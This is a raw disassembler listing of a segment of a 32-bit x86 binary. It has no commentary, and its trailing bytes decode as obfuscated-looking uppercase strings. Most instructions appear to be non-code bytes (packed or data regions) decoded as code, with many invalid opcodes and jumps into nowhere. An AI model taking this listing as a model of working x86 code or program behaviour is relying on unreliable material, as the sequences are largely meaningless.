  427159:	sub    eax,0x21852d31
  42715e:	jb     0x42712c
  427160:	push   ds
  427161:	inc    esi
  427162:	out    dx,eax
  427163:	pop    esp
  427164:	push   ecx
  427165:	aad    0x2f
  427167:	xchg   BYTE PTR [esi-0x3e],dl
  42716a:	(bad)  
  42716b:	jb     0x42712a
  42716d:	outs   dx,DWORD PTR ds:[esi]
  42716e:	ret    0x7001
  427171:	retf   0x1733
  427174:	adc    al,0x58
  427176:	or     eax,0xf035cfd8
  42717b:	xor    BYTE PTR [ebx],ch
  42717d:	or     edi,edx
  42717f:	call   0xb07bd922
  427184:	jg     0x4271f6
  427186:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427187:	pop    edx
  427188:	inc    edi
  427189:	sbb    al,0x2b
  42718b:	dec    esp
  42718c:	dec    edx
  42718d:	mov    dh,0x9
  42718f:	xchg   ecx,eax
  427190:	mov    edx,?
  427192:	pop    ss
  427193:	add    eax,0xee5e7c93
  427198:	or     al,0x69
  42719a:	push   ss
  42719b:	popa   
  42719c:	dec    edi
  42719d:	adc    DWORD PTR [ebx],ebp
  42719f:	daa    
  4271a0:	add    DWORD PTR [ebp-0x21],edx
  4271a3:	jb     0x42719e
  4271a5:	jecxz  0x427222
  4271a7:	jo     0x4271d6
  4271a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271aa:	mov    ds:0x89e6a6ef,al
  4271af:	push   esi
  4271b0:	sahf   
  4271b1:	je     0x427174
  4271b3:	xor    bh,BYTE PTR [eax-0x2b]
  4271b6:	scas   eax,DWORD PTR es:[edi]
  4271b7:	addr16 rcr esp,cl
  4271ba:	int    0x1a
  4271bc:	in     al,dx
  4271bd:	(bad)  
  4271be:	push   ds
  4271bf:	mov    WORD PTR [ecx+0x1516aa1d],es
  4271c5:	test   eax,0xa8706942
  4271ca:	iret   
  4271cb:	repz and DWORD PTR [edi+edx*2],0xdefc00
  4271d3:	mov    cl,0x1f
  4271d5:	test   eax,0x47fb18cc
  4271da:	add    cl,BYTE PTR [ebx]
  4271dc:	lds    ebp,FWORD PTR [esi+0x76df406f]
  4271e2:	ret    
  4271e3:	pop    ds
  4271e4:	and    BYTE PTR [esi],bl
  4271e6:	(bad)  
  4271e7:	xchg   ebx,eax
  4271e8:	inc    esp
  4271e9:	les    ebp,FWORD PTR [eax+0x708977a9]
  4271ef:	sar    DWORD PTR [ebx],0xf7
  4271f2:	les    edi,FWORD PTR [eax+0x54438423]
  4271f8:	mov    eax,ds:0x6beba819
  4271fd:	pusha  
  4271fe:	adc    al,0x95
  427200:	scas   al,BYTE PTR es:[edi]
  427201:	cmp    eax,edx
  427203:	lahf   
  427204:	pop    esp
  427205:	and    al,0x26
  427207:	cmc    
  427208:	outs   dx,DWORD PTR ds:[esi]
  427209:	rol    DWORD PTR [eax+0x8],0x20
  42720d:	adc    DWORD PTR [esp+ebx*8+0x5e],0x65
  427212:	mov    ah,0x13
  427214:	in     eax,dx
  427215:	out    0x9a,al
  427217:	dec    edi
  427218:	jge    0x42726f
  42721a:	stos   DWORD PTR es:[edi],eax
  42721b:	lock nop
  42721d:	mov    edx,0x94e23b14
  427222:	sbb    BYTE PTR [ecx],ch
  427224:	pop    ebx
  427225:	mov    edi,0x2fde7ef8
  42722a:	jnp    0x427273
  42722c:	pop    es
  42722d:	mov    ds:0x9d3eaf80,al
  427232:	sti    
  427233:	sub    ebp,ebx
  427235:	xchg   edx,eax
  427236:	pop    ds
  427237:	sub    DWORD PTR [ebp+0x21a92eaa],eax
  42723d:	into   
  42723e:	adc    ah,al
  427240:	dec    esp
  427241:	xor    cl,al
  427243:	test   BYTE PTR [ebx-0x30],dh
  427246:	outs   dx,BYTE PTR ds:[esi]
  427247:	fwait
  427248:	cmp    al,0xcc
  42724a:	sbb    eax,DWORD PTR [ecx]
  42724c:	cdq    
  42724d:	lods   eax,DWORD PTR ds:[esi]
  42724e:	daa    
  42724f:	outs   dx,BYTE PTR ds:[esi]
  427250:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427251:	inc    ebx
  427252:	inc    ebx
  427253:	enter  0x698a,0xfb
  427257:	push   DWORD PTR [ebx-0x306a4948]
  42725d:	out    dx,eax
  42725e:	hlt    
  42725f:	cli    
  427260:	sti    
  427261:	fild   WORD PTR [ecx]
  427263:	rol    DWORD PTR [edi-0x6d],1
  427266:	add    eax,0x473a39d1
  42726b:	inc    esi
  42726c:	push   0xe3ecd9e2
  427271:	cmp    ch,BYTE PTR [ebx-0x6b2287d4]
  427277:	sub    ah,BYTE PTR [esi+edx*4-0x2cc6684]
  42727e:	(bad)  
  42727f:	call   FWORD PTR ds:0xc1e5d683
  427285:	xchg   ebx,eax
  427286:	dec    esp
  427287:	fs mov ah,0xee
  42728a:	mov    ds:0x230f38a7,eax
  42728f:	mov    dl,0x5f
  427291:	out    dx,eax
  427292:	jmp    0x427270
  427294:	inc    edi
  427295:	adc    eax,0xab41b65c
  42729a:	gs aad 0x3c
  42729d:	jmp    0x427289
  42729f:	popf   
  4272a0:	and    eax,0x8dd3d0cd
  4272a5:	jp     0x427321
  4272a7:	push   ebx
  4272a8:	pushf  
  4272a9:	pop    eax
  4272aa:	inc    ebx
  4272ab:	repz inc ecx
  4272ad:	jge    0x42724d
  4272af:	(bad)  
  4272b1:	bound  ebx,QWORD PTR [esi]
  4272b3:	(bad)  
  4272b4:	lods   eax,DWORD PTR ds:[esi]
  4272b5:	jl     0x4272cd
  4272b7:	pop    esi
  4272b8:	daa    
  4272b9:	test   DWORD PTR [ebx+0x32],ebp
  4272bc:	or     ah,BYTE PTR [eax+0x49]
  4272bf:	inc    esp
  4272c0:	jno    0x4272d6
  4272c2:	pop    ecx
  4272c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272c4:	fdiv   QWORD PTR cs:[edx]
  4272c7:	cmp    eax,0xa60a217
  4272cc:	adc    dl,BYTE PTR [edi]
  4272ce:	adc    BYTE PTR [eax+0x21bd64e0],cl
  4272d4:	mov    al,0xa3
  4272d6:	and    al,0x25
  4272d8:	mov    fs,edi
  4272da:	lock (bad) 
  4272dd:	mov    ebp,DWORD PTR [ebx+0x1e]
  4272e0:	sbb    BYTE PTR [ecx],dl
  4272e2:	neg    DWORD PTR [ebx-0x42b424ed]
  4272e8:	mov    edi,0x79d4f940
  4272ed:	add    cl,ch
  4272ef:	popw   es
  4272f1:	lahf   
  4272f2:	xor    eax,0x47c0744b
  4272f7:	loopne 0x4272ef
  4272f9:	xchg   DWORD PTR [ebp+0x30e55813],edx
  4272ff:	xchg   DWORD PTR [edi+ebp*8-0x1f],esi
  427303:	popa   
  427304:	repz push esi
  427306:	stos   BYTE PTR es:[edi],al
  427307:	retf   
  427308:	inc    esi
  427309:	xor    eax,0x42eacfd6
  42730e:	inc    ebp
  42730f:	push   0x61
  427311:	adc    BYTE PTR [edi],bh
  427313:	cmp    DWORD PTR [edi+0x1b1e75c5],edx
  427319:	sub    bl,BYTE PTR [edx-0x7d]
  42731c:	or     BYTE PTR [eax+eax*2],ch
  42731f:	jl     0x427322
  427321:	fisub  WORD PTR [ebx-0x40e290d6]
  427327:	stos   BYTE PTR es:[edi],al
  427328:	pop    esp
  427329:	arpl   WORD PTR [edi],di
  42732b:	xchg   ebp,eax
  42732c:	ja     0x4272c4
  42732e:	sub    DWORD PTR [edx+0x12c876c5],eax
  427334:	sub    al,0xa7
  427336:	lea    ecx,[eax-0x16563af8]
  42733c:	sbb    BYTE PTR [ebx+0x7cded96c],bh
  427342:	sbb    cl,0x57
  427345:	scas   al,BYTE PTR es:[edi]
  427346:	inc    edx
  427347:	mov    dl,0x8f
  427349:	call   DWORD PTR [ecx]
  42734b:	xchg   DWORD PTR [ebx+0x4f],ecx
  42734e:	cld    
  42734f:	(bad)  [edx+0x6e]
  427352:	jnp    0x427307
  427354:	shr    DWORD PTR ds:0x3a45f7c8,cl
  42735a:	mov    ecx,0xeef96cff
  42735f:	hlt    
  427360:	ss push ss
  427362:	rol    bh,0xef
  427365:	add    BYTE PTR [ebp-0x36],dh
  427368:	mov    eax,DWORD PTR [esi-0x61]
  42736b:	repnz add DWORD PTR [esi+0x15],esp
  42736f:	sbb    edx,edx
  427371:	jecxz  0x42733a
  427373:	popa   
  427374:	sub    al,0x1
  427376:	fdivr  DWORD PTR [ebp+esi*4+0x7221e88b]
  42737d:	jne    0x4273e3
  42737f:	mov    ebx,ecx
  427381:	test   esi,esp
  427383:	and    BYTE PTR ds:0x606532d1,ah
  427389:	mov    esi,0x3f749b9c
  42738e:	add    DWORD PTR [ebx-0x22ea6d2f],ecx
  427394:	inc    esi
  427395:	mov    BYTE PTR [edi],dh
  427397:	gs cmp ebp,eax
  42739a:	xor    esp,DWORD PTR [ebx-0x59]
  42739d:	imul   esp,ebx,0x44ef2776
  4273a3:	push   edx
  4273a4:	ja     0x427404
  4273a6:	(bad)
  4273aa:	pop    esi
  4273ab:	enter  0xe4e,0x49
  4273af:	fistp  QWORD PTR [ebx+0x2eeeae7a]
  4273b5:	sub    BYTE PTR [ecx+0x73],al
  4273b8:	rcr    DWORD PTR [ecx+0x61],1
  4273bb:	and    edi,DWORD PTR [ebx-0x63]
  4273be:	pop    es
  4273bf:	retf   0xcf4c
  4273c2:	jmp    0x5246461d
  4273c7:	ror    BYTE PTR [eax+0x3170336a],cl
  4273cd:	jno    0x427445
  4273cf:	mov    ch,0x9e
  4273d1:	test   al,0x9a
  4273d3:	mov    edx,0x55feadc7
  4273d8:	jge    0x427439
  4273da:	leave  
  4273db:	addr16 in al,0x1b
  4273de:	popf   
  4273df:	out    0x16,eax
  4273e1:	xchg   ecx,eax
  4273e2:	pop    es
  4273e3:	push   ebx
  4273e4:	enter  0x9c29,0xa
  4273e8:	cmp    dh,bh
  4273ea:	mov    bh,0xa7
  4273ec:	mov    esp,0x87bb7ee9
  4273f1:	cs jl  0x4273a9
  4273f4:	(bad)  
  4273f5:	into   
  4273f6:	mov    eax,ds:0x14ce3c05
  4273fb:	mov    esp,0xaf39c5ba
  427400:	(bad)  
  427401:	out    0x4b,al
  427403:	shl    BYTE PTR [edi-0x1c],cl
  427406:	in     al,0x9d
  427408:	inc    ebp
  427409:	test   DWORD PTR [esi+0x629da4d3],edi
  42740f:	fcmovbe st,st(0)
  427411:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427412:	fbstp  TBYTE PTR [edi+0x290345a7]
  427418:	and    eax,0x93b6374c
  42741d:	mov    dl,0x41
  42741f:	add    DWORD PTR [eax-0x6c],0xffffff96
  427423:	test   al,0xdf
  427425:	inc    esi
  427426:	dec    ecx
  427427:	dec    eax
  427428:	(bad)  
  427429:	xor    BYTE PTR [ebx+0x13f6060f],ah
  42742f:	mov    al,ds:0x2977bdf8
  427434:	mov    dl,0xca
  427436:	jle    0x4273e1
  427438:	in     al,0x8d
  42743a:	mov    ebx,0xbb0ce571
  42743f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427440:	sbb    al,0x41
  427442:	outs   dx,BYTE PTR ds:[esi]
  427443:	and    esp,0x78
  427446:	add    DWORD PTR ds:0x892a3111,0xffffffac
  42744d:	call   0xe45:0xea48a9b
  427454:	cdq    
  427455:	and    ebp,0x3b10d6b
  42745b:	outs   dx,DWORD PTR ds:[esi]
  42745c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42745d:	pop    esi
  42745e:	nop
  42745f:	cwde   
  427460:	lea    edi,[esi+0x32]
  427463:	xchg   ecx,eax
  427464:	call   0xd3d451a
  427469:	pop    edx
  42746a:	jb     0x4274a9
  42746c:	adc    DWORD PTR [ecx+edx*4+0x2cb48f0f],edx
  427473:	hlt    
  427474:	shl    BYTE PTR [ebx+0x4b],1
  427477:	ret    0x7b4f
  42747a:	in     al,dx
  42747b:	jne    0x4274b7
  42747d:	retf   
  42747e:	fimul  WORD PTR [eax+0x3e1495b]
  427484:	cmp    ebp,edi
  427486:	icebp  
  427487:	sbb    ah,BYTE PTR [esi-0x15]
  42748a:	outs   dx,BYTE PTR ds:[esi]
  42748b:	rcl    ecx,0xd
  42748e:	sbb    al,0xcd
  427490:	ficomp DWORD PTR [esi+eax*4+0x4c]
  427494:	imul   ebp,DWORD PTR [eax-0x70],0x0
	...
  427514:	jbe    0x427541
  427516:	dec    eax
  427517:	jbe    0x427576
  427519:	ja     0x427599
  42751b:	sub    esi,DWORD PTR [ebp-0x4b]
  42751e:	(bad)  
  42751f:	retf   0xc855
  427522:	loop   0x4274aa
  427524:	xchg   ecx,eax
  427525:	add    eax,0xe0002
  42752a:	add    BYTE PTR [eax],al
  42752c:	cmp    DWORD PTR [ecx-0x62],ecx
  42752f:	jno    0x427598
  427531:	xor    edi,ebx
  427533:	pop    esi
  427534:	div    BYTE PTR [ecx+0x1efe1d6d]
	...
  427592:	add    BYTE PTR [eax],al
  427594:	cmp    ebp,DWORD PTR [eax+edx*1]
  427597:	add    BYTE PTR [esi+0x5c001070],ch
  42759d:	and    edx,DWORD PTR [eax]
  42759f:	add    BYTE PTR [eax+0x1b],dh
  4275a2:	adc    BYTE PTR [eax],al
  4275a4:	dec    ebp
  4275a5:	adc    dl,BYTE PTR [eax]
  4275a7:	add    BYTE PTR [ebx],bl
  4275a9:	and    dl,BYTE PTR [eax]
  4275ab:	add    BYTE PTR [ecx+0x20],dh
  4275ae:	adc    BYTE PTR [eax],al
  4275b0:	cmp    edx,DWORD PTR gs:[eax]
  4275b3:	add    BYTE PTR [ebx+0x51],dl
  4275b6:	push   esi
  4275b7:	aaa    
  4275b8:	pop    edi
  4275b9:	dec    esp
  4275ba:	push   ebp
  4275bb:	ss push ebp
  4275bd:	pop    edi
  4275be:	xor    al,0x43
  4275c0:	aaa    
  4275c1:	dec    edi
  4275c2:	inc    ecx
  4275c3:	add    BYTE PTR [ebx+0x30],al
  4275c6:	xor    eax,0x47475f30
  4275cb:	push   ecx
  4275cc:	push   ebp
  4275cd:	push   ebx
  4275ce:	pop    edi
  4275cf:	xor    DWORD PTR [edx],esi
  4275d1:	inc    edi
  4275d2:	add    BYTE PTR [edi+0x45],al
  4275d5:	push   ebp
  4275d6:	pop    edi
  4275d7:	push   eax
  4275d8:	push   edx
  4275d9:	inc    ebp
  4275da:	pop    edx
  4275db:	xor    BYTE PTR [edi+0x34],bl
  4275de:	dec    edx
  4275df:	add    BYTE PTR [edx+0x4b],cl
  4275e2:	inc    edi
  4275e3:	ss pop edi
  4275e5:	push   edx
  4275e6:	dec    ecx
  4275e7:	dec    edi
  4275e8:	pop    edi
  4275e9:	push   ebp
  4275ea:	xor    dl,BYTE PTR [edi+0x0]
  4275ed:	push   edi
  4275ee:	cmp    BYTE PTR [ecx],dh
  4275f0:	pop    edi
  4275f1:	xor    eax,0x505357
  4275f6:	dec    ebx
  4275f7:	inc    esp
  4275f8:	aaa    
  4275f9:	pop    edi
  4275fa:	inc    esp
  4275fb:	cmp    BYTE PTR [eax+esi*1+0x34],dl
  4275ff:	pop    edi
  427600:	push   esi
  427601:	add    BYTE PTR [edx+ebx*2+0x42],dl
  427605:	pop    edi
  427606:	push   ebp
  427607:	push   edx
  427608:	inc    esi
  427609:	inc    ebx
  42760a:	dec    esi
  42760b:	xor    eax,DWORD PTR [eax]
  42760d:	inc    ebx
  42760e:	cmp    DWORD PTR [edx+0x5f],eax
  427611:	inc    esi
  427612:	pop    edx
  427613:	push   esi
  427614:	cmp    BYTE PTR [edi+0x4a],bl
  427617:	add    BYTE PTR [ecx+0x38],al
  42761a:	xor    ebx,DWORD PTR [edi+0x52]
  42761d:	push   ebx
  42761e:	pop    ecx
  42761f:	inc    esi
  427620:	xor    al,0x5f
  427622:	xor    eax,0x5a005157
  427627:	push   ebp
  427628:	xor    dh,BYTE PTR [esi]
  42762a:	xor    bl,BYTE PTR [edi+0x33]
  42762d:	inc    esp
  42762e:	push   esi
  42762f:	dec    esp
  427630:	push   ebx
  427631:	pop    edi
  427632:	xor    al,0x0
  427634:	push   ebx
  427635:	cmp    DWORD PTR [ebp+0x33],eax
  427638:	cmp    BYTE PTR [edi+0x59],bl
  42763b:	xor    DWORD PTR [edi+ebx*2+0x46],eax
  42763f:	dec    ebx
  427640:	cmp    DWORD PTR [edx+ebx*2+0x0],ecx
  427644:	inc    esi
  427645:	xor    al,0x48
  427647:	pop    edi
  427648:	xor    ecx,DWORD PTR [eax+0x37]
  42764b:	cmp    DWORD PTR [edi+0x37],ebx
  42764e:	dec    esi
  42764f:	xor    al,0x51
  427651:	add    BYTE PTR [ebx+0x56],dl
  427654:	push   esp
  427655:	pop    edi
  427656:	xor    al,0x37
  427658:	xor    eax,0x325f3353
  42765d:	add    BYTE PTR [eax+0x59],bl
  427660:	inc    esp
  427661:	pop    edi
  427662:	dec    ebx
  427663:	push   esp
  427664:	dec    esp
  427665:	inc    esp
  427666:	pop    edi
  427667:	cmp    DWORD PTR [eax],eax
  427669:	push   edi
  42766a:	dec    eax
  42766b:	push   edi
  42766c:	pop    edi
  42766d:	inc    ebp
  42766e:	dec    esp
  42766f:	inc    ecx
  427670:	xor    DWORD PTR [edi+0x47],ebx
  427673:	add    BYTE PTR [edx+eax*2+0x51],dl
  427677:	pop    edi
  427678:	xor    eax,0x5137385a
  42767d:	xor    eax,0x574d5400
  427682:	pop    edi
  427683:	xor    DWORD PTR [edx+ebx*2+0x53],edx
  427687:	pop    edi
  427688:	pop    eax
  427689:	xor    BYTE PTR [ecx+0x5f],cl
  42768c:	xor    eax,0x33420030
  427691:	xor    al,0x32
  427693:	xor    DWORD PTR [edi+0x58],ebx
  427696:	inc    ecx
  427697:	dec    esi
  427698:	pop    edi
  427699:	inc    edx
  42769a:	push   ebp
  42769b:	push   ecx
  42769c:	add    BYTE PTR [ebp+0x31],al
  42769f:	ss pop edi
  4276a1:	xor    BYTE PTR [eax+0x4c],cl
  4276a4:	pop    edi
  4276a5:	cmp    DWORD PTR [ebp+0x53],edx
  4276a8:	add    BYTE PTR [ebp+0x41],al
  4276ab:	dec    eax
  4276ac:	cmp    BYTE PTR [edi+0x35],bl
  4276af:	dec    esi
  4276b0:	push   ebx
  4276b1:	dec    ebx
  4276b2:	add    BYTE PTR [edi+0x38],dl
  4276b5:	xor    DWORD PTR [edi+0x48],ebx
  4276b8:	xor    DWORD PTR [ebp+0x4e],eax
  4276bb:	ss pop edi
  4276bd:	dec    eax
  4276be:	cmp    DWORD PTR [edx+0x0],eax
  4276c1:	push   esp
  4276c2:	aaa    
  4276c3:	xor    bh,BYTE PTR [ecx]
  4276c5:	xor    al,0x31
  4276c7:	pop    edi
  4276c8:	push   edx
  4276c9:	push   edi
  4276ca:	push   edx
  4276cb:	dec    ecx
  4276cc:	add    BYTE PTR [esi+0x4d],al
  4276cf:	push   edi
  4276d0:	pop    edi
  4276d1:	pop    ecx
  4276d2:	xor    eax,0x45395a
  4276d7:	pop    eax
  4276d8:	dec    eax
  4276d9:	aaa    
  4276da:	pop    edi
  4276db:	xor    dl,BYTE PTR [ebx+0x39]
  4276de:	xor    dh,BYTE PTR [esi]
  4276e0:	xor    eax,0x3936525f
  4276e5:	add    BYTE PTR [ebx+0x50],cl
  4276e8:	inc    ecx
  4276e9:	pop    edi
  4276ea:	xor    eax,0x364c3737
  4276ef:	xor    BYTE PTR [ecx+0x0],dl
  4276f2:	push   ebx
  4276f3:	push   ebx
  4276f4:	inc    ebx
  4276f5:	xor    bl,BYTE PTR [edi+0x57]
  4276f8:	xor    BYTE PTR [ecx+0x43],al
  4276fb:	push   esp
  4276fc:	xor    eax,0x414a004e
  427701:	inc    ecx
  427702:	pop    edi
  427703:	cmp    DWORD PTR [esi+0x32],edx
  427706:	pop    edi
  427707:	xor    bh,BYTE PTR [ecx]
  427709:	add    BYTE PTR [ebx+0x42],cl
  42770c:	dec    esp
  42770d:	pop    edi
  42770e:	push   esi
  42770f:	xor    eax,0x47004c55
  427714:	xor    ecx,DWORD PTR [eax+0x5f]
  427717:	push   ecx
  427718:	dec    edi
  427719:	push   esp
  42771a:	cmp    BYTE PTR [eax+0x5f],dl
  42771d:	dec    ecx
  42771e:	add    BYTE PTR [ebp+0x33],cl
  427721:	inc    ebp
  427722:	pop    edi
  427723:	inc    edi
  427724:	dec    edi
  427725:	xor    eax,0x455f3249
  42772a:	add    BYTE PTR [edx+0x47],cl
  42772d:	xor    eax,0x4338535f
  427732:	dec    ecx
  427733:	xor    dh,BYTE PTR [eax]
  427735:	pop    edi
  427736:	push   eax
  427737:	add    BYTE PTR [eax+0x0],dl
  42773a:	pop    eax
  42773b:	add    BYTE PTR [eax+eax*1+0x5f],al
  42773f:	add    BYTE PTR [eax+0x0],cl
  427742:	aaa    
  427743:	add    BYTE PTR [ecx+0x0],bl
  427746:	aaa    
  427747:	add    BYTE PTR [edi+0x0],bl
  42774a:	inc    esi
  42774b:	add    BYTE PTR [edi],dh
  42774d:	add    BYTE PTR [ecx+0x0],bl
  427750:	inc    esp
  427751:	add    BYTE PTR [edi+0x0],bl
  427754:	xor    eax,0x52000000
  427759:	add    BYTE PTR [eax+0x0],dl
  42775c:	inc    esi
  42775d:	add    BYTE PTR [edi+0x0],bl
  427760:	dec    esp
  427761:	add    BYTE PTR [ecx+0x0],al
  427764:	push   eax
  427765:	add    BYTE PTR [edi+0x0],bl
  427768:	inc    ecx
  427769:	add    BYTE PTR [edi],dh
  42776b:	add    BYTE PTR [eax+eax*1+0x4a],al
  42776f:	add    BYTE PTR [ebp+0x0],al
  427772:	pop    edi
  427773:	add    BYTE PTR [eax+eax*1],dh
  427776:	add    BYTE PTR [eax],al
  427778:	dec    esp
  427779:	add    BYTE PTR [edi],dh
  42777b:	add    BYTE PTR [ebp+0x0],cl
  42777e:	cmp    BYTE PTR [eax],al
  427780:	xor    al,BYTE PTR [eax]
  427782:	pop    edi
  427783:	add    BYTE PTR [eax],bh
  427785:	add    BYTE PTR [ecx+0x0],al
  427788:	pop    edx
  427789:	add    BYTE PTR [edx+0x0],bl
  42778c:	pop    edi
  42778d:	add    BYTE PTR [ebx],dh
  42778f:	add    BYTE PTR [ebx+0x0],dl
  427792:	add    BYTE PTR [eax],al
  427794:	push   esi
  427795:	add    BYTE PTR [eax],bh
  427797:	add    BYTE PTR [esi+0x0],dl
  42779a:	xor    al,BYTE PTR [eax]
  42779c:	pop    edi
  42779d:	add    BYTE PTR [esi+0x0],al
  4277a0:	inc    ebx
  4277a1:	add    BYTE PTR [edi+0x0],al
  4277a4:	push   edi
  4277a5:	add    BYTE PTR [edi+0x0],bl
  4277a8:	dec    eax
  4277a9:	add    BYTE PTR [edx+0x0],cl
  4277ac:	cmp    DWORD PTR [eax],eax
  4277ae:	aaa    
  4277af:	add    BYTE PTR [eax],al
  4277b1:	add    BYTE PTR [ecx+0x0],cl
  4277b4:	dec    edx
  4277b5:	add    BYTE PTR [ecx+0x0],al
  4277b8:	pop    edi
  4277b9:	add    BYTE PTR [edx+0x0],cl
  4277bc:	inc    esi
  4277bd:	add    BYTE PTR [edi+0x0],dl
  4277c0:	xor    eax,DWORD PTR [eax]
  4277c2:	dec    ebp
  4277c3:	add    BYTE PTR [edi+0x0],bl
  4277c6:	push   eax
  4277c7:	add    BYTE PTR [ecx+0x0],al
  4277ca:	add    BYTE PTR [eax],al
  4277cc:	dec    edi
  4277cd:	add    BYTE PTR [ecx+0x0],bl
  4277d0:	dec    eax
  4277d1:	add    BYTE PTR [edi+0x0],bl
  4277d4:	xor    eax,0x33005000
  4277d9:	add    BYTE PTR [esi+0x0],al
  4277dc:	push   esi
  4277dd:	add    BYTE PTR [edi+0x0],bl
  4277e0:	push   ebx
  4277e1:	add    BYTE PTR [ecx+0x0],dl
  4277e4:	push   ebp
  4277e5:	add    BYTE PTR [eax],al
  4277e7:	add    BYTE PTR [esi+0x0],al
  4277ea:	dec    esp
  4277eb:	add    BYTE PTR [ecx],dh
  4277ed:	add    BYTE PTR [edi+0x0],bl
  4277f0:	dec    ebx
  4277f1:	add    BYTE PTR [edx+0x0],dl
  4277f4:	inc    ebx
  4277f5:	add    BYTE PTR [edi+0x0],bl
  4277f8:	dec    edx
  4277f9:	add    BYTE PTR [eax],bh
  4277fb:	add    BYTE PTR [esi+0x0],dl
  4277fe:	cmp    DWORD PTR [eax],eax
  427800:	cmp    DWORD PTR [eax],eax
  427802:	add    BYTE PTR [eax],al
  427804:	dec    eax
  427805:	add    BYTE PTR [ecx+0x0],bl
  427808:	push   edx
  427809:	add    BYTE PTR [edi+0x0],bl
  42780c:	inc    esp
  42780d:	add    BYTE PTR [ebx+0x0],dl
  427810:	dec    edx
  427811:	add    BYTE PTR [ebx],dh
  427813:	add    BYTE PTR [eax],al
  427815:	add    BYTE PTR [eax+eax*1+0x5a],dl
  427819:	add    BYTE PTR [ecx+0x0],dl
  42781c:	pop    edi
  42781d:	add    BYTE PTR [ebx+0x0],dl
  427820:	cmp    BYTE PTR [eax],al
  427822:	dec    ebx
  427823:	add    BYTE PTR [eax+eax*1],dh
  427826:	xor    al,BYTE PTR [eax]
  427828:	add    BYTE PTR [eax],al
  42782a:	dec    ecx
  42782b:	add    BYTE PTR [eax+0x0],dl
  42782e:	xor    BYTE PTR [eax],al
  427830:	add    BYTE PTR ss:[edi+0x0],bl
  427834:	inc    esi
  427835:	add    BYTE PTR [ebp+0x0],dl
  427838:	inc    edx
  427839:	add    BYTE PTR [eax],al
  42783b:	add    BYTE PTR [edx+0x0],bl
  42783e:	xor    eax,DWORD PTR [eax]
  427840:	inc    ecx
  427841:	add    BYTE PTR [edi],dh
  427843:	add    BYTE PTR [edi+0x0],bl
  427846:	inc    edi
  427847:	add    BYTE PTR [edx+0x0],bl
  42784a:	xor    BYTE PTR [eax],al
  42784c:	push   edx
  42784d:	add    BYTE PTR [edi+0x0],bl
  427850:	aaa    
  427851:	add    BYTE PTR [edx+0x0],dl
  427854:	push   eax
  427855:	add    BYTE PTR [esi+0x0],cl
  427858:	dec    esi
  427859:	add    BYTE PTR [eax],al
  42785b:	add    BYTE PTR [eax+0x0],dl
  42785e:	cmp    DWORD PTR [eax],eax
  427860:	cmp    DWORD PTR [eax],eax
  427862:	xor    eax,DWORD PTR [eax]
  427864:	xor    al,0x0
  427866:	xor    eax,0x36003700
  42786b:	add    BYTE PTR ds:0x41005f00,dh
  427871:	add    BYTE PTR [ecx+0x0],al
  427874:	add    BYTE PTR [eax],al
  427876:	dec    edx
  427877:	add    BYTE PTR [esi+0x0],cl
  42787a:	pop    eax
  42787b:	add    BYTE PTR [edi+0x0],bl
  42787e:	inc    edi
  42787f:	add    BYTE PTR [ecx],bh
  427881:	add    BYTE PTR [edx+0x0],al
  427884:	pop    edx
  427885:	add    BYTE PTR [ebp+0x0],cl
  427888:	pop    edi
  427889:	add    BYTE PTR [ecx+0x0],dl
  42788c:	inc    ebp
  42788d:	add    BYTE PTR [ebp+0x0],dl
  427890:	add    BYTE PTR [eax],al
  427892:	push   eax
  427893:	add    BYTE PTR [eax+eax*1+0x38],al
  427897:	add    BYTE PTR [esi],dh
  427899:	add    BYTE PTR [edi+0x0],bl
  42789c:	xor    al,BYTE PTR [eax]
  42789e:	dec    eax
  42789f:	add    BYTE PTR [esi+0x0],cl
  4278a2:	dec    ecx
  4278a3:	add    BYTE PTR [eax],al
  4278a5:	add    BYTE PTR [eax],al
  4278a7:	xchg   esp,eax
  4278a8:	jne    0x4278ec
  4278aa:	add    BYTE PTR [eax-0x63ffbd8b],bl
  4278b0:	jne    0x4278f4
  4278b2:	add    BYTE PTR [eax-0x5bffbd8b],ah
  4278b8:	jne    0x4278fc
  4278ba:	add    BYTE PTR [eax-0x53ffbd8b],ch
  4278c0:	jne    0x427904
  4278c2:	add    BYTE PTR [eax+0x4275],dh
  4278c8:	add    BYTE PTR [eax],al
  4278ca:	add    BYTE PTR [ebp+esi*2-0x6d],cl
  4278ce:	dec    ebp
  4278cf:	add    BYTE PTR [eax],al
  4278d1:	add    BYTE PTR [eax],al
  4278d3:	add    al,BYTE PTR [eax]
  4278d5:	add    BYTE PTR [eax],al
  4278d7:	inc    edx
  4278d8:	add    BYTE PTR [eax],al
  4278da:	add    BYTE PTR [eax],al
  4278dc:	loopne 0x4278de
  4278de:	add    BYTE PTR [eax],al
  4278e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278e1:	add    BYTE PTR [eax],al
  4278e3:	add    BYTE PTR [eax],al
  4278e5:	add    BYTE PTR [eax],al
  4278e7:	aas    
  4278e8:	add    BYTE PTR [edx],0x0
  4278eb:	push   ecx
  4278ec:	add    BYTE PTR [edx],0x0
  4278ef:	imul   eax,DWORD PTR [edx-0x7d7efffe],0x82970002
  4278f9:	add    al,BYTE PTR [eax]
  4278fb:	stos   DWORD PTR es:[edi],eax
  4278fc:	add    BYTE PTR [edx],0x0
  4278ff:	add    BYTE PTR [eax],al
  427901:	add    BYTE PTR [eax],al
  427903:	rol    DWORD PTR [edx-0x7d20fffe],1
  427909:	add    al,BYTE PTR [eax]
  42790b:	jmp    0xf3427b92
  427910:	add    BYTE PTR [edx],0x0
  427913:	std    
  427914:	add    BYTE PTR [edx],0x0
  427917:	jae    0x835f791f
  42791d:	add    al,BYTE PTR [eax]
  42791f:	and    eax,0x35000283
  427924:	add    DWORD PTR [edx],0x0
  427927:	aas    
  427928:	add    DWORD PTR [edx],0x0
  42792b:	dec    ecx
  42792c:	add    DWORD PTR [edx],0x0
  42792f:	push   ebx
  427930:	add    DWORD PTR [edx],0x0
  427933:	pop    ebp
  427934:	add    DWORD PTR [edx],0x0
  427937:	add    DWORD PTR [bp+si],0x0
  42793b:	jno    0x4278c0
  42793d:	add    al,BYTE PTR [eax]
  42793f:	jns    0x4278c4
  427941:	add    al,BYTE PTR [eax]
